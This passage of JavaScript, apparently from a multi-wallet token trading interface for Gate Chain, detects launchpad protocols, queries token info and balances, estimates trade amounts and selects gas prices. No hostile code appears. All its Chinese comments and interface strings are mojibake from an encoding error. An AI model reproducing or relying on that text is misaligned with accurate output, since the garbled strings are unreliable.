                    showToast(`üîç Ëá™Âä®Ê£ÄÊµãÂà∞${detectedProtocol === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR'}ÂçèËÆÆÔºåÂ∑≤Ëá™Âä®ÂàáÊç¢`, 'info');
                }
            }
            
            return detectedProtocol;
        }

        // Ëé∑ÂèñÂêàÁ∫¶‰ΩôÈ¢ù‰ø°ÊÅØ
        async function getContractBalance(tokenAddress, protocol) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                if (protocol === 'GTLAUNCH') {
                    // GTLAUNCHÂÜÖÁõòÔºöËé∑ÂèñÂêàÁ∫¶ÁöÑGT‰ΩôÈ¢ù
                    const gtBalance = await provider.getBalance(tokenAddress);
                    const gtBalanceFormatted = parseFloat(ethers.formatEther(gtBalance));
                    
                    return {
                        type: 'GT',
                        balance: gtBalance,
                        formattedBalance: gtBalanceFormatted,
                        label: 'GT‰ΩôÈ¢ù'
                    };
                } else if (protocol === 'DYOR_INTERNAL') {
                    // DYORÂÜÖÁõòÔºöËé∑ÂèñÂêàÁ∫¶ÁöÑWGT‰ΩôÈ¢ù
                    const WGT_ADDRESS = '0x672f30407a71fa8737a3a14474ff37e09c7fc44a'; // Gate Chain WGTÂú∞ÂùÄ
                    const wgtContract = new ethers.Contract(WGT_ADDRESS, ERC20_ABI, provider);
                    const wgtBalance = await wgtContract.balanceOf(tokenAddress);
                    const wgtBalanceFormatted = parseFloat(ethers.formatEther(wgtBalance));
                    
                    return {
                        type: 'WGT',
                        balance: wgtBalance,
                        formattedBalance: wgtBalanceFormatted,
                        label: 'WGT‰ΩôÈ¢ù'
                    };
                }
                
                return null;
            } catch (error) {
                console.error('Ëé∑ÂèñÂêàÁ∫¶‰ΩôÈ¢ùÂ§±Ë¥•:', error);
                return null;
            }
        }

        // ÊòæÁ§∫ÂêàÁ∫¶‰ΩôÈ¢ù‰ø°ÊÅØ
        function displayContractBalance(balanceInfo) {
            const contractBalanceDisplay = document.getElementById('contractBalanceDisplay');
            const balanceLabel = document.getElementById('balanceLabel');
            const balanceValue = document.getElementById('balanceValue');
            
            if (balanceInfo) {
                contractBalanceDisplay.style.display = 'block';
                balanceLabel.textContent = balanceInfo.label;
                balanceValue.textContent = balanceInfo.formattedBalance.toFixed(4);
            } else {
                contractBalanceDisplay.style.display = 'none';
            }
        }

        // Ëé∑Âèñ‰ª£Â∏Å‰ø°ÊÅØ
        // Èò≤ÊäñÊü•ËØ¢‰ª£Â∏Å‰ø°ÊÅØ
        function debounceFetchTokenInfo() {
            // Ê∏ÖÈô§‰πãÂâçÁöÑÂÆöÊó∂Âô®
            if (fetchTokenTimeout) {
                clearTimeout(fetchTokenTimeout);
            }
            
            const tokenAddressInput = document.getElementById('tokenAddress');
            const tokenAddress = tokenAddressInput.value.trim();
            const tokenInfoDisplay = document.getElementById('tokenInfoDisplay');
            
            // ÈáçÁΩÆËæìÂÖ•Ê°ÜÁä∂ÊÄÅ
            tokenAddressInput.classList.remove('loading', 'error', 'success');
            
            // È™åËØÅÂú∞ÂùÄÊ†ºÂºè
            if (!tokenAddress) {
                tokenInfoDisplay.style.display = 'none';
                document.getElementById('tokenDisplay').classList.remove('active');
                return;
            }
            
            if (!tokenAddress.startsWith('0x')) {
                tokenAddressInput.classList.add('error');
                showTokenInfoError('Âú∞ÂùÄÊ†ºÂºèÈîôËØØÔºåÂøÖÈ°ª‰ª•0xÂºÄÂ§¥');
                return;
            }
            
            if (tokenAddress.length < 42) {
                tokenAddressInput.classList.add('loading');
                showTokenInfoLoading('Âú∞ÂùÄÈïøÂ∫¶‰∏çË∂≥...');
                return;
            }
            
            if (tokenAddress.length === 42) {
                // ÊòæÁ§∫Âä†ËΩΩÁä∂ÊÄÅ
                tokenAddressInput.classList.add('loading');
                showTokenInfoLoading('Ê≠£Âú®Êü•ËØ¢‰ª£Â∏Å‰ø°ÊÅØ...');
                
                // ËÆæÁΩÆÊñ∞ÁöÑÂÆöÊó∂Âô®Ôºå500msÂêéÊâßË°åÊü•ËØ¢
                fetchTokenTimeout = setTimeout(function() {
                    fetchTokenInfo();
                }, 500);
            }
        }

        // ÊòæÁ§∫‰ª£Â∏Å‰ø°ÊÅØÂä†ËΩΩÁä∂ÊÄÅ
        function showTokenInfoLoading(message) {
            const tokenInfoDisplay = document.getElementById('tokenInfoDisplay');
            const tokenInfoLogo = document.getElementById('tokenInfoLogo');
            const tokenInfoName = document.getElementById('tokenInfoName');
            const tokenInfoSymbol = document.getElementById('tokenInfoSymbol');
            const statusIndicator = document.getElementById('statusIndicator');
            const statusText = document.getElementById('statusText');
            
            tokenInfoDisplay.style.display = 'block';
            tokenInfoLogo.innerHTML = '<span class="loading-spinner"></span>';
            tokenInfoName.textContent = 'Êü•ËØ¢‰∏≠...';
            tokenInfoSymbol.textContent = 'LOADING';
            statusIndicator.className = 'status-indicator loading';
            statusText.textContent = message;
        }

        // ÊòæÁ§∫‰ª£Â∏Å‰ø°ÊÅØÈîôËØØÁä∂ÊÄÅ
        function showTokenInfoError(message) {
            const tokenInfoDisplay = document.getElementById('tokenInfoDisplay');
            const tokenInfoLogo = document.getElementById('tokenInfoLogo');
            const tokenInfoName = document.getElementById('tokenInfoName');
            const tokenInfoSymbol = document.getElementById('tokenInfoSymbol');
            const statusIndicator = document.getElementById('statusIndicator');
            const statusText = document.getElementById('statusText');
            
            tokenInfoDisplay.style.display = 'block';
            tokenInfoLogo.textContent = '‚ùå';
            tokenInfoName.textContent = 'Êü•ËØ¢Â§±Ë¥•';
            tokenInfoSymbol.textContent = 'ERROR';
            statusIndicator.className = 'status-indicator error';
            statusText.textContent = message;
        }

        // ÊòæÁ§∫‰ª£Â∏Å‰ø°ÊÅØÊàêÂäüÁä∂ÊÄÅ
        function showTokenInfoSuccess(tokenInfo) {
            const tokenInfoDisplay = document.getElementById('tokenInfoDisplay');
            const tokenInfoLogo = document.getElementById('tokenInfoLogo');
            const tokenInfoName = document.getElementById('tokenInfoName');
            const tokenInfoSymbol = document.getElementById('tokenInfoSymbol');
            const statusIndicator = document.getElementById('statusIndicator');
            const statusText = document.getElementById('statusText');
            
            tokenInfoDisplay.style.display = 'block';
            tokenInfoLogo.textContent = tokenInfo.symbol.substring(0, 2);
            tokenInfoName.textContent = tokenInfo.name;
            tokenInfoSymbol.textContent = tokenInfo.symbol;
            statusIndicator.className = 'status-indicator success';
            statusText.textContent = 'Êü•ËØ¢ÊàêÂäü';
            
            // ÊòæÁ§∫‰ª∑Ê†º‰ø°ÊÅØÂå∫Âüü
            document.getElementById('priceInfoDisplay').style.display = 'block';
        }

        // ÊòæÁ§∫‰ª£Â∏ÅÊü•ËØ¢Âä†ËΩΩÁä∂ÊÄÅÔºà‰øùÁïôÂéüÊúâÂáΩÊï∞ÂÖºÂÆπÊÄßÔºâ
        function showTokenLoadingState() {
            const tokenDisplay = document.getElementById('tokenDisplay');
            const tokenLogo = document.getElementById('tokenLogo');
            const tokenName = document.getElementById('tokenName');
            const tokenSymbol = document.getElementById('tokenSymbol');
            
            tokenLogo.innerHTML = '<span class="loading-spinner"></span>';
            tokenName.textContent = 'Êü•ËØ¢‰∏≠...';
            tokenSymbol.textContent = 'LOADING';
            tokenDisplay.classList.add('active');
        }

        async function fetchTokenInfo() {
            const tokenAddress = document.getElementById('tokenAddress').value.trim();
            
            // È™åËØÅÂú∞ÂùÄÊ†ºÂºè
            if (!tokenAddress || !tokenAddress.startsWith('0x') || tokenAddress.length !== 42) {
                document.getElementById('tokenDisplay').classList.remove('active');
                currentTokenInfo = null;
                return;
            }
            
            // Ê£ÄÊü•ÁºìÂ≠ò
            if (tokenCache[tokenAddress]) {
                currentTokenInfo = tokenCache[tokenAddress];
                displayTokenInfo(tokenCache[tokenAddress]);
                await renderWallets();
                await updateTokenInfoDisplay(); // Êõ¥Êñ∞‰ª∑Ê†ºÂíå‰ΩôÈ¢ù‰ø°ÊÅØ
                return;
            }
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                
                // Âπ∂Ë°åËé∑Âèñ‰ª£Â∏Å‰ø°ÊÅØ
                const [name, symbol, decimals] = await Promise.all([
                    tokenContract.name().catch(function() { return 'Unknown Token'; }),
                    tokenContract.symbol().catch(function() { return 'UNKNOWN'; }),
                    tokenContract.decimals().catch(function() { return 18; })
                ]);
                
                const tokenInfo = { 
                    address: tokenAddress, 
                    name: name, 
                    symbol: symbol, 
                    decimals: decimals 
                };
                
                // ÁºìÂ≠ò‰ª£Â∏Å‰ø°ÊÅØ
                tokenCache[tokenAddress] = tokenInfo;
                currentTokenInfo = tokenInfo;
                
                // ÊòæÁ§∫‰ª£Â∏Å‰ø°ÊÅØ
                displayTokenInfo(tokenInfo);
                showTokenInfoSuccess(tokenInfo);
                
                // Ëá™Âä®Ê£ÄÊµã‰ª£Â∏ÅÂçèËÆÆÂπ∂ÂàáÊç¢
                const detectedProtocol = await autoSelectInternalProtocol(tokenAddress);
                
                // Â∞ÜÂçèËÆÆ‰ø°ÊÅØ‰øùÂ≠òÂà∞‰ª£Â∏Å‰ø°ÊÅØ‰∏≠
                tokenInfo.protocol = detectedProtocol;
                tokenCache[tokenAddress].protocol = detectedProtocol;
                
                // Ëé∑ÂèñÂêàÁ∫¶‰ΩôÈ¢ù‰ø°ÊÅØÔºà‰ªÖÂÜÖÁõòÔºâ
                if (selectedPlatform === 'internal') {
                    const contractBalanceInfo = await getContractBalance(tokenAddress, detectedProtocol);
                    displayContractBalance(contractBalanceInfo);
                } else {
                    // Â§ñÁõòÈöêËóèÂêàÁ∫¶‰ΩôÈ¢ùÊòæÁ§∫
                    document.getElementById('contractBalanceDisplay').style.display = 'none';
                }
                
                // Êõ¥Êñ∞Èí±ÂåÖÂàóË°®
                await renderWallets();
                
                // Êõ¥Êñ∞‰ª∑Ê†ºÂíå‰ΩôÈ¢ù‰ø°ÊÅØ
                await updateTokenInfoDisplay();
                
                // ÊòæÁ§∫ÊàêÂäüÊèêÁ§∫
                showToast(`‚úÖ ÊàêÂäüËé∑Âèñ‰ª£Â∏Å‰ø°ÊÅØ: ${symbol}`, 'success');
                
                // ËÆæÁΩÆËæìÂÖ•Ê°ÜÊàêÂäüÁä∂ÊÄÅ
                document.getElementById('tokenAddress').classList.remove('loading');
                document.getElementById('tokenAddress').classList.add('success');
                
            } catch (e) {
                console.error('Failed to fetch token info:', e);
                document.getElementById('tokenDisplay').classList.remove('active');
                currentTokenInfo = null;
                showTokenInfoError('Êó†Ê≥ïËé∑Âèñ‰ª£Â∏Å‰ø°ÊÅØÔºåËØ∑Ê£ÄÊü•ÂêàÁ∫¶Âú∞ÂùÄ');
                showToast('‚ùå Êó†Ê≥ïËé∑Âèñ‰ª£Â∏Å‰ø°ÊÅØÔºåËØ∑Ê£ÄÊü•ÂêàÁ∫¶Âú∞ÂùÄ', 'error');
                
                // ËÆæÁΩÆËæìÂÖ•Ê°ÜÈîôËØØÁä∂ÊÄÅ
                document.getElementById('tokenAddress').classList.remove('loading');
                document.getElementById('tokenAddress').classList.add('error');
            }
        }

        // ÊòæÁ§∫‰ª£Â∏Å‰ø°ÊÅØ
        function displayTokenInfo(tokenInfo) {
            // Êõ¥Êñ∞ÂçñÂá∫Á™óÂè£ÁöÑÊ†áÁ≠æ
            document.getElementById('sellAmountLabel').textContent = `ÂçñÂá∫‰ª£Â∏ÅÊï∞Èáè (${tokenInfo.symbol})`;
            
            // ÊòæÁ§∫ÂçèËÆÆ‰ø°ÊÅØ
            if (tokenInfo.protocol) {
                const protocolElement = document.getElementById('tokenInfoProtocol');
                const protocolBadge = document.getElementById('protocolBadge');
                
                protocolElement.style.display = 'block';
                protocolBadge.textContent = tokenInfo.protocol === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                protocolBadge.className = `protocol-badge ${tokenInfo.protocol.toLowerCase()}`;
            }
        }

        // ËÆæÁΩÆ‰π∞ÂÖ•ÁôæÂàÜÊØî
        async function setBuyPercentage(percentage) {
            const activeWallets = wallets.filter(function(w) { return w.active; });
            if (activeWallets.length === 0) {
                showToast('ËØ∑ÂÖàÂêØÁî®Èí±ÂåÖ', 'error');
                return;
            }
            
            const balance = await getBalance(activeWallets[0].address);
            const amount = (parseFloat(balance) * percentage / 100).toFixed(4);
            document.getElementById('buyAmount').value = amount;
            
            // Êõ¥Êñ∞‰π∞ÂÖ•È¢ÑËÆ°Êî∂Áõä
            updateBuyExpected();
        }

        // ËÆæÁΩÆÂçñÂá∫ÁôæÂàÜÊØî
        async function setSellPercentage(percentage) {
            if (!currentTokenInfo) {
                showToast('ËØ∑ÂÖàÈÄâÊã©‰ª£Â∏Å', 'error');
                return;
            }
            
            const activeWallets = wallets.filter(function(w) { return w.active; });
            if (activeWallets.length === 0) {
                showToast('ËØ∑ÂÖàÂêØÁî®Èí±ÂåÖ', 'error');
                return;
            }
            
            const tokenAddress = currentTokenInfo.address;
            const wallet = activeWallets[0];
            const balanceInfo = await getTokenBalance(tokenAddress, wallet.address);
            const tokenAmount = (parseFloat(balanceInfo.formattedBalance) * percentage / 100).toFixed(4);
            document.getElementById('sellAmount').value = tokenAmount;
            
            // Êõ¥Êñ∞ÂçñÂá∫È¢ÑËÆ°Êî∂Áõä
            updateSellExpected();
        }

        // Êõ¥Êñ∞‰π∞ÂÖ•È¢ÑËÆ°Êî∂Áõä
        async function updateBuyExpected() {
            const buyExpected = document.getElementById('buyExpected');
            const buySpendGT = document.getElementById('buySpendGT');
            const buyGetTokens = document.getElementById('buyGetTokens');
            
            if (!currentTokenInfo) {
                buyExpected.style.display = 'none';
                return;
            }
            
            const amount = parseFloat(document.getElementById('buyAmount').value) || 0;
            if (amount <= 0) {
                buyExpected.style.display = 'none';
                return;
            }
            
            try {
                // ‰ΩøÁî®ÁºìÂ≠òÁöÑ‰ª∑Ê†º‰ø°ÊÅØ
                let priceInfo = window.currentPriceInfo;
                if (!priceInfo) {
                    // GTLAUNCHÂÜÖÁõò‰∏çÊòæÁ§∫‰ª∑Ê†ºÔºåÂè™ÊòæÁ§∫‰∫§ÊòìÈáëÈ¢ù
                    if (currentTokenInfo.protocol === 'GTLAUNCH' && selectedPlatform === 'internal') {
                        buySpendGT.textContent = `${amount} GT`;
                        buyGetTokens.textContent = `ÂæÖËÆ°ÁÆó ${currentTokenInfo.symbol}`;
                        buyExpected.style.display = 'block';
                        return;
                    }
                    priceInfo = await calculateTokenPrice(currentTokenInfo.address);
                    window.currentPriceInfo = priceInfo;
                }
                
                if (priceInfo.error || priceInfo.pricePerGT === 0) {
                    buySpendGT.textContent = `${amount} GT`;
                    buyGetTokens.textContent = `0.0000 ${currentTokenInfo.symbol}`;
                    buyExpected.style.display = 'block';
                    return;
                }
                
                const expectedTokenAmount = amount * priceInfo.pricePerGT;
                
                buySpendGT.textContent = `${amount} GT`;
                buyGetTokens.textContent = `${expectedTokenAmount.toFixed(4)} ${currentTokenInfo.symbol}`;
                buyExpected.style.display = 'block';
            } catch (error) {
                console.error('Failed to update buy expected:', error);
                buyExpected.style.display = 'none';
            }
        }

        // Êõ¥Êñ∞ÂçñÂá∫È¢ÑËÆ°Êî∂Áõä
        async function updateSellExpected() {
            const sellExpected = document.getElementById('sellExpected');
            const sellSpendTokens = document.getElementById('sellSpendTokens');
            const sellGetGT = document.getElementById('sellGetGT');
            
            if (!currentTokenInfo) {
                sellExpected.style.display = 'none';
                return;
            }
            
            const amount = parseFloat(document.getElementById('sellAmount').value) || 0;
            if (amount <= 0) {
                sellExpected.style.display = 'none';
                return;
            }
            
            try {
                // ‰ΩøÁî®ÁºìÂ≠òÁöÑ‰ª∑Ê†º‰ø°ÊÅØ
                let priceInfo = window.currentPriceInfo;
                if (!priceInfo) {
                    // GTLAUNCHÂÜÖÁõò‰∏çÊòæÁ§∫‰ª∑Ê†ºÔºåÂè™ÊòæÁ§∫‰∫§ÊòìÈáëÈ¢ù
                    if (currentTokenInfo.protocol === 'GTLAUNCH' && selectedPlatform === 'internal') {
                        sellSpendTokens.textContent = `${amount} ${currentTokenInfo.symbol}`;
                        sellGetGT.textContent = `ÂæÖËÆ°ÁÆó GT`;
                        sellExpected.style.display = 'block';
                        return;
                    }
                    priceInfo = await calculateTokenPrice(currentTokenInfo.address);
                    window.currentPriceInfo = priceInfo;
                }
                
                if (priceInfo.error || priceInfo.pricePerToken === 0) {
                    sellSpendTokens.textContent = `${amount} ${currentTokenInfo.symbol}`;
                    sellGetGT.textContent = `0.000000 GT`;
                    sellExpected.style.display = 'block';
                    return;
                }
                
                const expectedGTAmount = amount * priceInfo.pricePerToken;
                
                sellSpendTokens.textContent = `${amount} ${currentTokenInfo.symbol}`;
                sellGetGT.textContent = `${expectedGTAmount.toFixed(6)} GT`;
                sellExpected.style.display = 'block';
            } catch (error) {
                console.error('Failed to update sell expected:', error);
                sellExpected.style.display = 'none';
            }
        }

        // ËÆæÁΩÆGasÈÄüÂ∫¶
        function setGasSpeed(speed) {
            currentGasSpeed = speed;
            
            // Êõ¥Êñ∞ÊåâÈíÆÁä∂ÊÄÅ
            const buttons = document.querySelectorAll('.gas-speed-btn');
            buttons.forEach(btn => btn.classList.remove('active'));
            document.getElementById('gas' + speed).classList.add('active');
            
            // Á´ãÂç≥Êõ¥Êñ∞Gas‰ª∑Ê†ºÊòæÁ§∫
            const speedConfig = GAS_CONFIG.SPEEDS[speed];
            const newGasPrice = GAS_CONFIG.DEFAULT_PRICE * speedConfig.multiplier;
            document.getElementById('gasPrice').value = Math.round(newGasPrice);
            
            // ÈùôÈªòÊõ¥Êñ∞Ôºå‰∏çÊòæÁ§∫ÊèêÁ§∫
            console.log(`Â∑≤ÈÄâÊã© ${speedConfig.name} Ê®°Âºè - ${Math.round(newGasPrice)} Gwei`);
        }

        // Ëé∑ÂèñÂä®ÊÄÅGas‰ª∑Ê†º
        async function getDynamicGasPrice() {
            const rpcUrls = [CONFIG.rpcUrl, CONFIG.backupRpcUrl];
            
            for (let i = 0; i < rpcUrls.length; i++) {
                try {
                    console.log(`Â∞ùËØï‰ªéRPC ${i+1} Ëé∑ÂèñGas‰ª∑Ê†º: ${rpcUrls[i]}`);
                    
                    // Ê£ÄÊü•URLÊòØÂê¶Áõ∏ÂêåÔºåÈÅøÂÖçÈáçÂ§çÊµãËØï
                    if (i > 0 && rpcUrls[i] === rpcUrls[i-1]) {
                        console.log(`RPC ${i+1} ‰∏éRPC ${i} Áõ∏ÂêåÔºåË∑≥ËøáÊµãËØï`);
                        continue;
                    }
                    
                    const provider = new ethers.JsonRpcProvider(rpcUrls[i], {
                        chainId: CONFIG.chainId,
                        name: 'Gate Chain'
                    });
                    
                    // ËÆæÁΩÆË∂ÖÊó∂Êó∂Èó¥
                    const timeoutPromise = new Promise((_, reject) => 
                        setTimeout(() => reject(new Error('RPCËØ∑Ê±ÇË∂ÖÊó∂')), 10000)
                    );
                    
                    // ‰ΩøÁî®Â§öÁßçÊñπÊ≥ïËé∑ÂèñGas‰ª∑Ê†º
                    let baseGasPrice;
                    try {
                        // ÊñπÊ≥ï1: Â∞ùËØïÁõ¥Êé•RPCË∞ÉÁî®
                        console.log(`RPC ${i+1} Â∞ùËØïÊñπÊ≥ï1: provider.send('eth_gasPrice')`);
                        const gasPricePromise = provider.send('eth_gasPrice', []);
                        baseGasPrice = await Promise.race([gasPricePromise, timeoutPromise]);
                        console.log(`RPC ${i+1} ÊñπÊ≥ï1ÊàêÂäü:`, baseGasPrice);
                    } catch (gasError1) {
                        console.log(`RPC ${i+1} ÊñπÊ≥ï1Â§±Ë¥•:`, gasError1.message);
                        
                        // Ê£ÄÊü•ÊòØÂê¶ÊòØCORSÈîôËØØ
                        if (gasError1.message.includes('Failed to fetch') || gasError1.message.includes('CORS')) {
                            console.log(`RPC ${i+1} Ê£ÄÊµãÂà∞CORSÈóÆÈ¢òÔºåË∑≥ËøáÂÖ∂‰ªñÊñπÊ≥ï`);
                            throw new Error('CORSÈîôËØØ: Êó†Ê≥ïËÆøÈóÆÊ≠§RPCËäÇÁÇπ');
                        }
                        
                        try {
                            // ÊñπÊ≥ï2: Â∞ùËØïgetGasPriceÊñπÊ≥ï
                            console.log(`RPC ${i+1} Â∞ùËØïÊñπÊ≥ï2: provider.getGasPrice()`);
                            if (typeof provider.getGasPrice === 'function') {
                                const gasPricePromise = provider.getGasPrice();
                                baseGasPrice = await Promise.race([gasPricePromise, timeoutPromise]);
                                console.log(`RPC ${i+1} ÊñπÊ≥ï2ÊàêÂäü:`, baseGasPrice);
                            } else {
                                throw new Error('getGasPriceÊñπÊ≥ï‰∏çÂ≠òÂú®');
                            }
                        } catch (gasError2) {
                            console.log(`RPC ${i+1} ÊñπÊ≥ï2Â§±Ë¥•:`, gasError2.message);
                            throw new Error('ÊâÄÊúâethers.jsÊñπÊ≥ïÈÉΩÂ§±Ë¥•');
                        }
                    }
                    
                    // È™åËØÅGas‰ª∑Ê†ºÊòØÂê¶ÂêàÁêÜ (1-10000 Gwei‰πãÈó¥ÔºåÊâ©Â§ßËåÉÂõ¥)
                    const gasPriceInGwei = Number(ethers.formatUnits(baseGasPrice, 'gwei'));
                    console.log(`RPC ${i+1} ËøîÂõûÁöÑGas‰ª∑Ê†º: ${gasPriceInGwei} Gwei`);
                    
                    if (gasPriceInGwei < 1 || gasPriceInGwei > 10000) {
                        throw new Error(`Gas‰ª∑Ê†ºÂºÇÂ∏∏: ${gasPriceInGwei} Gwei`);
                    }
                    
                    // ‰ΩøÁî®RPC‰ª∑Ê†º‰πò‰ª•ÂÄçÊï∞
                    const speedConfig = GAS_CONFIG.SPEEDS[currentGasSpeed];
                    const adjustedGasPrice = baseGasPrice * BigInt(Math.floor(speedConfig.multiplier * 100)) / 100n;
                    
                    // Êõ¥Êñ∞ÊòæÁ§∫
                    const gasPriceInput = document.getElementById('gasPrice');
                    gasPriceInput.value = Math.round(Number(ethers.formatUnits(adjustedGasPrice, 'gwei')));
                    
                    console.log(`Gas‰ª∑Ê†ºËé∑ÂèñÊàêÂäü (RPC ${i+1}): Âü∫Á°Ä‰ª∑Ê†º ${gasPriceInGwei.toFixed(2)} Gwei, Ë∞ÉÊï¥Âêé ${Number(ethers.formatUnits(adjustedGasPrice, 'gwei')).toFixed(2)} Gwei`);
                    console.log(`ÂΩìÂâçGasÈÄüÂ∫¶: ${speedConfig.name} (${speedConfig.multiplier}x)`);
                    showToast(`‚úÖ Ëé∑ÂèñÂÆûÊó∂Gas‰ª∑Ê†ºÊàêÂäü: ${Math.round(Number(ethers.formatUnits(adjustedGasPrice, 'gwei')))} Gwei (${speedConfig.name})`, 'success');
                    
                    return {
                        baseGasPrice: baseGasPrice,
                        adjustedGasPrice: adjustedGasPrice,
                        priorityFee: ethers.parseUnits("100", "gwei"),
                        maxFee: adjustedGasPrice
                    };
                } catch (error) {
                    console.error(`RPC ${i+1} Ëé∑ÂèñGas‰ª∑Ê†ºÂ§±Ë¥•:`, error);
                    
                    // Â¶ÇÊûúÊòØCORSÈîôËØØÔºåÁõ¥Êé•Ë∑≥ËøáÂ§áÁî®ËäÇÁÇπ
                    if (error.message.includes('CORS')) {
                        console.log(`RPC ${i+1} CORSÈîôËØØÔºåË∑≥ËøáÂêéÁª≠ÊµãËØï`);
                        break;
                    }
                    
                    if (i === rpcUrls.length - 1) {
                        // ÊâÄÊúâRPCÈÉΩÂ§±Ë¥•‰∫ÜÔºå‰ΩøÁî®ÈªòËÆ§ÂÄº
                        break;
                    }
                }
            }
            
            // ‰ΩøÁî®ÈªòËÆ§ÂÄº
            const speedConfig = GAS_CONFIG.SPEEDS[currentGasSpeed];
            const defaultBaseGas = ethers.parseUnits(GAS_CONFIG.DEFAULT_PRICE.toString(), "gwei"); // ÈªòËÆ§500 Gwei
            const defaultAdjustedGas = defaultBaseGas * BigInt(Math.floor(speedConfig.multiplier * 100)) / 100n;
            
            // Êõ¥Êñ∞ÊòæÁ§∫
            const gasPriceInput = document.getElementById('gasPrice');
            gasPriceInput.value = Math.round(Number(ethers.formatUnits(defaultAdjustedGas, 'gwei')));
            
            // ÈùôÈªò‰ΩøÁî®ÈªòËÆ§ÂÄºÔºå‰∏çÊòæÁ§∫ÊèêÁ§∫
            
            return {
                baseGasPrice: defaultBaseGas,
                adjustedGasPrice: defaultAdjustedGas,
                priorityFee: ethers.parseUnits("100", "gwei"),
                maxFee: defaultAdjustedGas
            };
        }

        // Ëé∑Âèñ‰ª£Â∏Å‰ΩôÈ¢ù
        async function getTokenBalance(tokenAddress, walletAddress) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, provider);
                const balance = await tokenContract.balanceOf(walletAddress);
                const decimals = await tokenContract.decimals();
                
                return {
                    balance: balance,
                    decimals: decimals,
                    formattedBalance: ethers.formatUnits(balance, decimals)
                };
            } catch (error) {
                console.error('Failed to get token balance:', error);
                return {
                    balance: 0n,
                    decimals: 18,
                    formattedBalance: '0'
                };
            }
        }

        // Ê£ÄÊü•ÂçèËÆÆÂåπÈÖçÂπ∂ÊòæÁ§∫ÊèêÈÜí
        function checkProtocolMatch(error) {
            if (currentTokenInfo && currentTokenInfo.protocol) {
                const detectedProtocol = currentTokenInfo.protocol;
                const currentDex = selectedDex;
                
                // Ê£ÄÊü•ÂÜÖÁõòÂçèËÆÆÂåπÈÖç
                if (selectedPlatform === 'internal') {
                    if (detectedProtocol === 'GTLAUNCH' && currentDex !== 'GTLAUNCH') {
                        showToast(`‚ö†Ô∏è ÂçèËÆÆ‰∏çÂåπÈÖçÔºÅ‰ª£Â∏ÅÊòØGTLAUNCHÂçèËÆÆÔºå‰ΩÜÈÄâÊã©‰∫Ü${currentDex}ÂçèËÆÆ„ÄÇËØ∑ÈáçÊñ∞ÈÄâÊã©Ê≠£Á°ÆÁöÑÂçèËÆÆ„ÄÇ`, 'error');
                        return true;
                    } else if (detectedProtocol === 'DYOR_INTERNAL' && currentDex !== 'DYOR_INTERNAL') {
                        showToast(`‚ö†Ô∏è ÂçèËÆÆ‰∏çÂåπÈÖçÔºÅ‰ª£Â∏ÅÊòØDYORÂçèËÆÆÔºå‰ΩÜÈÄâÊã©‰∫Ü${currentDex}ÂçèËÆÆ„ÄÇËØ∑ÈáçÊñ∞ÈÄâÊã©Ê≠£Á°ÆÁöÑÂçèËÆÆ„ÄÇ`, 'error');
                        return true;
                    }
                }
                
                // Ê£ÄÊü•Â§ñÁõòÂçèËÆÆÂåπÈÖç
                if (selectedPlatform === 'external') {
                    if (detectedProtocol === 'GTLAUNCH' || detectedProtocol === 'DYOR_INTERNAL') {
                        showToast(`‚ö†Ô∏è ÂçèËÆÆ‰∏çÂåπÈÖçÔºÅ‰ª£Â∏ÅÊòØ${detectedProtocol}ÂÜÖÁõòÂçèËÆÆÔºå‰ΩÜÈÄâÊã©‰∫ÜÂ§ñÁõò„ÄÇËØ∑ÂàáÊç¢Âà∞ÂÜÖÁõòÂπ∂ÈÄâÊã©Ê≠£Á°ÆÁöÑÂçèËÆÆ„ÄÇ`, 'error');
                        return true;
                    }
                }
            }
            return false;
        }

        // ËÆ°ÁÆó‰ª£Â∏Å‰ª∑Ê†ºÔºàÊ†πÊçÆÈÄâÊã©ÁöÑÂπ≥Âè∞‰ΩøÁî®‰∏çÂêåÁöÑËÆ°ÁÆóÊñπÊ≥ïÔºâ
        async function calculateTokenPrice(tokenAddress) {
            try {
                console.log(`ÂºÄÂßãËÆ°ÁÆó‰ª£Â∏Å‰ª∑Ê†º: ${tokenAddress}, Âπ≥Âè∞: ${selectedPlatform}, DEX: ${selectedDex}`);
                
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                if (selectedPlatform === 'internal') {
                    // ÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆó - Ê†πÊçÆ‰ª£Â∏ÅÂçèËÆÆÂà§Êñ≠
                    if (currentTokenInfo && currentTokenInfo.protocol) {
                        if (currentTokenInfo.protocol === 'DYOR_INTERNAL') {
                            console.log('‰ΩøÁî®DYORÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆóÔºàÂü∫‰∫éÂçèËÆÆÊ£ÄÊµãÔºâ');
                            return await calculateDYORInternalPrice(tokenAddress, provider);
                        } else if (currentTokenInfo.protocol === 'GTLAUNCH') {
                            console.log('‰ΩøÁî®GTLAUNCHÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆóÔºàÂü∫‰∫éÂçèËÆÆÊ£ÄÊµãÔºâ');
                            return await calculateInternalPrice(tokenAddress, provider);
                        }
                    }
                    
                    // Â¶ÇÊûúÊ≤°ÊúâÂçèËÆÆ‰ø°ÊÅØÔºåÊ†πÊçÆselectedDexÂà§Êñ≠
                    if (selectedDex === 'DYOR_INTERNAL') {
                        console.log('‰ΩøÁî®DYORÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆóÔºàÂü∫‰∫éselectedDexÔºâ');
                        return await calculateDYORInternalPrice(tokenAddress, provider);
                    } else {
                        console.log('‰ΩøÁî®GTLAUNCHÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆóÔºàÂü∫‰∫éselectedDexÔºâ');
                        return await calculateInternalPrice(tokenAddress, provider);
                    }
                } else {
                    // Â§ñÁõòGTSWAP/DYOR V2‰ª∑Ê†ºËÆ°ÁÆó
